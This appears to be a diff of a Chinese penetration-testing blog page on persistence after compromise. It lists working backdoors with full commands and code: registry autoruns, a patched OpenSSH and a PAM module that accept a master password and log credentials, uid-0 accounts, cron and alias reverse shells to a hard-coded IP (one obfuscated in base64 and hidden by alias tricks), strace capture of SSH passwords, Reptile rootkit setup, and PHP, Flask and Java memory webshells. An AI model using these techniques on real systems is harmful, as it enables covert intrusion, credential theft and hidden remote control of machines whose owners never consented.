+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WinLogon配合无文件落地上线</span></span><br><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /V &quot;Userinit&quot; /t REG_SZ /F /D &quot;C:\xd.exe&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">屏幕保护生效后执行后门</span></span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.</span><br><span class="line">EXE /t REG_SZ /d &quot;C:\xd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<h3 id="linux权限维持"><a class="markdownIt-Anchor" href="#linux权限维持">#</a> linux 权限维持</h3>
+<h4 id="openssh版本后门"><a class="markdownIt-Anchor" href="#openssh版本后门">#</a> OpenSSH 版本后门</h4>
+<p>替换本身操作系统的 ssh 协议支撑软件 openssh，重新安装自定义的 openssh, 达到记录帐号密码，也可以采用万能密码连接的功能。更隐秘的方法可以做版本修改及文件修改时间处理。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参考链接：</span></span><br><span class="line">https://www.cnblogs.com/csnd/p/11807653.html</span><br><span class="line">https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境准备：</span></span><br><span class="line">yum -y install openssl openssl-devel pam-devel zlib zlib-devel</span><br><span class="line">yum -y install gcc gcc-c++ make</span><br><span class="line">wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br><span class="line">tar -xzvf openssh-5.9p1.tar.gz</span><br><span class="line">tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1 &amp;&amp; patch &lt; sshbd5.9p1.diff</span><br><span class="line">vim version.h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑密码</span></span><br><span class="line">vim includes.h</span><br><span class="line">177 #define ILOG &quot;/tmp/ilog&quot;#ILOG是别人用ssh登录该主机记录的日志</span><br><span class="line">178 #define OLOG &quot;/tmp/olog&quot;#OLOG是该主机用ssh登录其他主机记录的日志目录</span><br><span class="line">179 #define SECRETPW &quot;xiaodi&quot;#万能密码</span><br><span class="line">180 #endif /* INCLUDES_H */</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装编译：</span></span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 &amp;&amp; make &amp;&amp; make install</span><br><span class="line">service sshd restart #重启sshd服务</span><br><span class="line">systemctl status sshd.service #查看ssh启动状态</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以采用万能密码登录 、实现监控服务器登录登出的账号密码（发到外网）</span></span><br></pre></td></tr></table></figure>
+<h4 id="ssh-pam后门"><a class="markdownIt-Anchor" href="#ssh-pam后门">#</a> SSH PAM 后门</h4>
+<p>PAM 是一种认证模块，PAM 可以作为 Linux 登录验证和各类基础服务的认 证，简单来说就是一种用于 Linux 系统上的用户身份验证的机制。进行认证时 首先确定是什么服务，然后加载相应的 PAM 的配置文件 (位于 /etc/pam.d)，最后 调用认证文件 (于 /lib/security) 进行安全认证。简易利用的 PAM 后门也是通过修改 PAM 源码中认证的逻辑来达到权限维持。</p>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkwMg==">https://xz.aliyun.com/t/7902</span></p>
+<p>获取目标系统使用的 PAM 版本，下载对应版本的 pam 版本。解压缩，改 p am_unix_auth.c 文件，添加万能密码。编译安装 PAM。编译完后的文件在:mo dules/pam_unix/.libs/pam_unix.so，复制到 /lib64/security 中进行替换，即使用万 能密码登陆，将用户名密码记录到文件中。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置环境</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询版本</span></span><br><span class="line">rpm -qa | grep pam</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装此版本</span></span><br><span class="line">wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf Linux-PAM-1.1.8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">yum install gcc flex flex-devel -y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">留PAM后门和保存SSH登录的账号密码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改 Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c180 行/* verify the password of this user */</span></span><br><span class="line">retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">if(strcmp(&quot;hackers&quot;,p)==0)&#123;return PAM_SUCCESS;&#125; //后门密码</span><br><span class="line">if(retval == PAM_SUCCESS)&#123;</span><br><span class="line">FILE * fp;</span><br><span class="line">fp = fopen(&quot;/tmp/.sshlog&quot;, &quot;a&quot;);//SSH登录用户密码保存位置</span><br><span class="line">fprintf(fp, &quot;%s : %s\n&quot;, name, p);</span><br><span class="line">fclose(fp);&#125;</span><br><span class="line">name = p = NULL;</span><br><span class="line">AUTH_RETURN;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装并备份</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译安装：</span></span><br><span class="line">./configure &amp;&amp; make</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份原有pam_unix.so，防止出现错误登录不上，复制新PAM模块到/lib64/security/目录下</span></span><br><span class="line">cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp</span><br><span class="line">cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so</span><br></pre></td></tr></table></figure>
+<h4 id="ssh软链接"><a class="markdownIt-Anchor" href="#ssh软链接">#</a> SSH 软链接</h4>
+<p>在 sshd 服务配置启用 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时，只要 pam_rootok 模块检测 uid 为 0 （root）即可成功认证登录。重启之后会失效，而且会多出来一个端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否使用PAM进行身份验证：</span></span><br><span class="line">cat /etc/ssh/sshd_config|grep UsePAM</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br><span class="line">ssh root@xx.xx.xx.xx -p 8888 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任意密码登录即可</span></span><br></pre></td></tr></table></figure>
+<h4 id="公私钥后门"><a class="markdownIt-Anchor" href="#公私钥后门">#</a> 公私钥后门</h4>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3YxNzcyMTM0NS8=">https://www.bilibili.com/read/cv17721345/</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成密钥对</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改ssh配置</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<h4 id="添加root帐号"><a class="markdownIt-Anchor" href="#添加root帐号">#</a> 添加 root 帐号</h4>
+<p>添加账号 test1，设置 uid 为 0 ，密码为 123456</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd - 1 - salt &#x27;salt&#x27; 123456` test1 -o -u 0 -g root -G</span><br><span class="line">root -s /bin/bash -d /home/test1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者直接打印到passwd中：</span></span><br><span class="line">echo &quot;xiaodi:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd #增加超级用户账号</span><br><span class="line">passwd xiaodi #修改xiaodi的密码为xiaodi123</span><br></pre></td></tr></table></figure>
+<h4 id="定时任务后门"><a class="markdownIt-Anchor" href="#定时任务后门">#</a> 定时任务后门</h4>
+<p>利用系统的定时任务功能进行反弹 Shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑后门反弹</span></span><br><span class="line">vim /etc/.xiaodi.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;1</span><br><span class="line">chmod +x /etc/.xiaodi.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加定时任务（分时天月周）</span></span><br><span class="line">vim /etc/crontab</span><br><span class="line">*/1 * * * * root /etc/.xiaodi.sh</span><br></pre></td></tr></table></figure>
+<h4 id="strace-监控后门"><a class="markdownIt-Anchor" href="#strace-监控后门">#</a> Strace 监控后门</h4>
+<p>strace 是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围。当其他机器登录时，会将 ssh 的登录情况保存，可以实现实时监控 ssh 密码，可以将其自动发到外网上。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记录sshd明文</span></span><br><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line">grep -E &#x27;read\(6, &quot;.+\\ 0 \\ 0 \\ 0 \\.+&quot;&#x27; /tmp/.sshd.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记录sshd私钥</span></span><br><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>
+<h4 id="alias后门"><a class="markdownIt-Anchor" href="#alias后门">#</a> Alias 后门</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入<span class="built_in">ls</span>即可反弹shell</span></span><br><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;1; &#125;;alerts&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这样做效果达到了，但是<span class="built_in">ls</span>原功能无法执行成功</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">去掉别名</span></span><br><span class="line">unalias ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不影响<span class="built_in">ls</span>使用情况下的别名后门：</span></span><br><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(bas</span><br><span class="line">e64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\&#x27;&#x27;UTF-8&#x27;\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\&#x27;&#x27;aW1w b3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgc mV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgP SBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVF JFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiNDcuOTQuMjM2LjExNyIsIDY2NjYp KQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kd XAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygp LCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwg Ii1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp&#x27; \&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;al ias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: n ot found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line"></span><br><span class="line">alias alias=&#x27;alerts()&#123; alias &quot;$@&quot; | grep -v unalias | sed &quot;s/alerts.*lambda.*/ls --color=auto&#x27;\&#x27;&#x27;/&quot;;&#125;;alerts&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">持久化+隐藏：重启依旧生效</span></span><br><span class="line">vim /etc/upload</span><br><span class="line">vim ～/.bashrc</span><br><span class="line">if [ -f /etc/upload ]; then</span><br><span class="line">. /etc/upload</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<h4 id="rootkit后门"><a class="markdownIt-Anchor" href="#rootkit后门">#</a> Rootkit 后门</h4>
+<p>现在常用的 linux 维持权限的方法大多用 crontab 和开机自启动，同时使用 的大多是 msf 或者其它的 tcp 连接来反弹 shell , 这种做法比较容易被管理员发 现。所以我们想有一个非 tcp 连接、流量不容易被怀疑的后门，并且在大量的 s hell 的场景下，可以管 shell，Reptile 刚好是种 LKM rootkit，因此具有很好的隐 藏性和强大的功能。如需检测此后门是否存在，需要使用类似于 gscan、checkr ootkit 的工具检测，但不一定能捕获到流量特征。</p>
+<p>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3JlbGVhc2VzLw==">https://github.com/f0rb1dd3n/Reptile/releases/</span></p>
+<ul>
+<li>自动化脚本</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos自动化脚本</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">kernel=`<span class="built_in">uname</span> -r`</span></span><br><span class="line">yum -y install perl vim gcc make g++ unzip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地</span></span><br><span class="line">yum -y localinstall kernel-devel-&quot;$kernal&quot;.rpm</span><br><span class="line">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh</span><br><span class="line">./setup.sh install &lt;&lt;EOF</span><br><span class="line">reptile</span><br><span class="line">hax0r</span><br><span class="line">s3cr3t</span><br><span class="line">reptile</span><br><span class="line">666</span><br><span class="line">y</span><br><span class="line">47.94.236.117</span><br><span class="line">4444</span><br><span class="line">1</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ubuntu自动化脚本</span></span><br><span class="line">apt-get install vim gcc make g++ unzip -y</span><br><span class="line">apt-get -y install linux-headers-$(uname -r)</span><br><span class="line">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh</span><br><span class="line">./setup.sh install &lt;&lt;EOF</span><br><span class="line">reptile</span><br><span class="line">hax0r</span><br><span class="line">s3cr3t</span><br><span class="line">reptile</span><br><span class="line">666</span><br><span class="line">y</span><br><span class="line">47.94.236.117</span><br><span class="line">4444</span><br><span class="line">1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p>使用参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3dpa2k=">https://github.com/f0rb1dd3n/Reptile/wiki</span></p>
+<ul>
+<li>隐藏进程文件连接属性</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配合msf上线，隐藏msf的进程</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">隐藏进程</span></span><br><span class="line">/reptile/reptile_cmd hide pid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示进程</span></span><br><span class="line">/reptile/reptile_cmd show pid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">隐藏连接</span></span><br><span class="line">/reptile/reptile_cmd udp pid port hide</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示连接</span></span><br><span class="line">/reptile/reptile_cmd tcp pid port show</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">隐藏文件 文件名中带reptile的都会被隐藏</span></span><br><span class="line">mkdir reptile_xiaodi</span><br></pre></td></tr></table></figure>
+<ul>
+<li>无须木马通过肉机软件直接控制肉机</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端安装: ./setup.sh client</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置连接配置：要填写的信息为在肉机上安装 rookit时填写的目标主机 ip和端口，以及自己为其设置的密码和token值，至于 22 的端口，是伪造的，可以随意填写对方正在运行的端口。</span></span><br><span class="line">set LHOST 47.94.236.117</span><br><span class="line">set LPORT 4444</span><br><span class="line">set SRCHOST 47.94.236.117</span><br><span class="line">set SRCPORT 666</span><br><span class="line">set RHOST 121.43.154.113</span><br><span class="line">set RPORT 22</span><br><span class="line">set PROT TCP</span><br><span class="line">set PASS s3cr3t</span><br><span class="line">set TOKEN hax0r</span><br></pre></td></tr></table></figure>
+<h3 id="web内存马"><a class="markdownIt-Anchor" href="#web内存马">#</a> web 内存马</h3>
+<p>链接:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L01lbVNoZWxsRGVtbw==">https://github.com/jweny/MemShellDemo</span></p>
+<p>Webshell 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制 Web 服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的 Webshell 都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马， 区别在于 Webshell 内存马是无文件马，利用中间件的进程执行某些恶意代码， 不会有文件落地，给检测带来巨大难度。</p>
+<p>内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测， 通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 We bshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>
+<h4 id="php内存马"><a class="markdownIt-Anchor" href="#php内存马">#</a> php 内存马</h4>
+<p>set_time_limit () 函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep () 函数在执行程序时的持续时间将会被忽略掉）</p>
+<p>ignore_user_abort () 函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为 True，则忽略与用户的断开）</p>
+<p>unlink (FILE) 函数：删除文件（防止文件落地被检测工具查杀）</p>
+<p>file_put_contents 函数：将一个字符串写入该文件中</p>
+<p>usleep 函数：延迟执行当前脚本数微秒，即条件竞争</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">@unlink(__FILE__);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">file = <span class="string">&#x27;.HH.php&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">code = <span class="string">&#x27;&lt;?php @eval($_POST[\&#x27;</span>c\<span class="string">&#x27;]); ?&gt;&#x27;</span>;</span></span><br><span class="line">while (1)&#123;</span><br><span class="line"><span class="meta prompt_">  file_put_contents($</span><span class="language-bash">file,<span class="variable">$code</span>);</span></span><br><span class="line">  usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="py内存马"><a class="markdownIt-Anchor" href="#py内存马">#</a> py 内存马</h4>
+<p>链接：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA5MzM=">https://xz.aliyun.com/t/10933</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">example1</span></span><br><span class="line">http://47.94.236.117:5000/test?param=&#123;&#123;url_for.__globals__[%27__builtins__% 27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lamb da%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27c md%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__g lobals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_ app%27]&#125;)&#125;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">example2</span></span><br><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(</span><br><span class="line">&#x27;/shell&#x27;,</span><br><span class="line">&#x27;shell&#x27;,</span><br><span class="line">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="line">)&quot;, &#123;</span><br><span class="line">&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;] &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h4 id="java内存马"><a class="markdownIt-Anchor" href="#java内存马">#</a> java 内存马</h4>
+<p>链接: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE5MDU0OS5odG1s">https://www.secpulse.com/archives/190549.html</span></p>
+<p>（ 1 ）按攻击思路，大致分为：<br>
 Java Instrumentation 类（Agent 型）<br>
 Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
-Spring 类（Controller 型、Interceptor 型）<br>
-（ 2 ）按注入的对象分为：tomcat、weblogic、shiro 等类型。<br>
+Spring 类（Controller 型、Interceptor 型）</p>
+<p>（ 2 ）按注入的对象分为：tomcat、weblogic、shiro 等类型。<br>
 Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
 哥斯拉，冰蝎内存马功能使用</p>
 
+      <div class="tags">
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
+      </div>
   </div>
 
    <footer>
@@ -606,9 +309,9 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-04 02:50:47" itemprop="dateModified" datetime="2023-07-04T02:50:47+08:00">2023-07-04</time>
+    <time title="修改时间：2023-07-04 18:59:38" itemprop="dateModified" datetime="2023-07-04T18:59:38+08:00">2023-07-04</time>
   </span>
-  <span id="2023/07/04/SAFE/12 权限维持/" class="item leancloud_visitors" data-flag-title="" title="阅读次数">
